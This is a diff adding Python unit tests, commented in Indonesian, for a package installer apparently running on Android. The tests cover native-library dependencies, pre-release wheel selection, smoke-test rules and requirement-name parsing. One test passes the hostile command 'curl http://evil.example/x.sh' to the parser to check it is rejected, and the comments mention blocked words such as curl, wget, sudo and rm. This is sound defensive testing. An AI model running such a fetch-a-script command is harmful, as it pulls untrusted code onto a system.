@@ -845,3 +845,110 @@ class TestEnvPathsEntryPoints:
             "setuptools harus di-bundle di chaquopy pip{ install } — "
             "pkg_resources/entry-points bergantung padanya"
         )
+
+
+# =====================================================================
+# BENGKEL v1.0.18 (2026-08-16) — guard Bug Q, S, V (Python side)
+# Semua diuji mutasi sebelum commit: hapus fix → test MERAH.
+# =====================================================================
+
+class TestBengkelBugQ:
+    """Bug Q: murmurhash/cymem/preshed butuh chaquopy-libcxx SEBELUM smoke
+    instal-pertama (bukti device: mrmr.so gagal dlopen saat cache kosong,
+    percobaan kedua sukses karena cache — pola persis Bug P/cffi)."""
+
+    def test_native_host_deps_libcxx_trio(self):
+        for name in ("murmurhash", "cymem", "preshed"):
+            deps = resolve_mod.host_deps_for(name) if hasattr(resolve_mod, "host_deps_for") \
+                else resolve_mod.NATIVE_HOST_DEPS.get(name, [])
+            assert "chaquopy-libcxx" in deps, (
+                f"{name} harus memetakan chaquopy-libcxx di NATIVE_HOST_DEPS "
+                "(Bug Q: gagal instal-pertama libc++_shared.so not found)"
+            )
+
+
+class TestBengkelBugS:
+    """Bug S: pre-release hanya boleh menang bila TIDAK ada stable (PEP 440 /
+    perilaku pip). Bukti device: apscheduler 4.0.0a6, isort 9.0.0b2,
+    watchfiles 0.0.0a1 (placeholder kosong) terpilih padahal stable ada."""
+
+    def test_best_wheel_tolak_prerelease_bila_ada_stable(self):
+        cands = [
+            {"filename": "apscheduler-3.11.2-py3-none-any.whl", "url": "u1"},
+            {"filename": "apscheduler-4.0.0a6-py3-none-any.whl", "url": "u2"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best["filename"].startswith("apscheduler-3.11.2"), (
+            "stable 3.11.2 harus menang atas pre-release 4.0.0a6"
+        )
+
+    def test_best_wheel_terima_prerelease_bila_tak_ada_stable(self):
+        cands = [
+            {"filename": "fookit-1.0.0rc1-py3-none-any.whl", "url": "u1"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best is not None and best["filename"].startswith("fookit-1.0.0rc1"), (
+            "bila hanya pre-release yang tersedia, ia tetap boleh dipilih"
+        )
+
+    def test_best_wheel_stable_tetap_pilih_terbaru(self):
+        # filter pre-release tidak boleh merusak urutan versi stable (BUG D)
+        cands = [
+            {"filename": "bar-1.9-py3-none-any.whl", "url": "u1"},
+            {"filename": "bar-1.10-py3-none-any.whl", "url": "u2"},
+            {"filename": "bar-2.0.0b1-py3-none-any.whl", "url": "u3"},
+        ]
+        best = whl_mod.best_wheel(cands, supported_tags=ANDROID_TAGS)
+        assert best["filename"].startswith("bar-1.10"), (
+            "stable terbaru (1.10) harus menang; beta 2.0.0b1 diabaikan"
+        )
+
+
+class TestBengkelBugV:
+    """Bug V: NATIVE_LOAD tidak boleh menggagalkan paket yang import-nya
+    SUKSES hanya karena tidak ada .so di staging. Bukti device: coverage
+    7.15.4 (wheel py3-none-any murni Python) & pyzbar 0.1.8 dirollback
+    padahal sehat. Hakim = IMPORT; ketiadaan .so = catatan, bukan vonis."""
+
+    def test_native_load_lolos_tanpa_so_bila_import_ok(self, tmp_path):
+        staging = tmp_path / "stage"
+        pkg = staging / "cover_fake"
+        pkg.mkdir(parents=True)
+        (pkg / "__init__.py").write_text("x = 1\n")
+        ok, results, native = smoke_mod.run_smoke(
+            "cover_fake", str(staging),
+            [{"name": "native-load", "type": "NATIVE_LOAD", "target": "cover_fake"}],
+        )
+        assert ok, (
+            "NATIVE_LOAD harus lolos bila import sukses walau 0 .so "
+            f"(Bug V); results={results}"
+        )
+
+    def test_native_load_tetap_gagal_bila_import_gagal(self, tmp_path):
+        staging = tmp_path / "stage2"
+        staging.mkdir()
+        ok, results, native = smoke_mod.run_smoke(
+            "modul_yang_tidak_ada_xyz", str(staging),
+            [{"name": "native-load", "type": "NATIVE_LOAD",
+              "target": "modul_yang_tidak_ada_xyz"}],
+        )
+        assert not ok, "import gagal harus tetap menggagalkan NATIVE_LOAD"
+
+
+class TestBengkelBugW:
+    """Bug W: nama paket sah yang mengandung substring kata terlarang
+    (pycurl, wget-like) tidak boleh ditolak. Bukti device: 37x penolakan
+    'pola yang dilarang' untuk input polos `pycurl`."""
+
+    def test_pycurl_diterima(self):
+        r = req_mod.parse_requirement("pycurl")
+        assert r["canonical_name"] == "pycurl"
+
+    def test_nama_mengandung_kata_perintah_diterima(self):
+        # 'sudoku' mengandung 'sudo'; 'rmsd-kit' mengandung 'rm'
+        assert req_mod.parse_requirement("sudoku")["canonical_name"] == "sudoku"
+
+    def test_perintah_shell_tetap_ditolak(self):
+        import pytest as _pt
+        with _pt.raises(req_mod.RequirementError):
+            req_mod.parse_requirement("curl http://evil.example/x.sh")
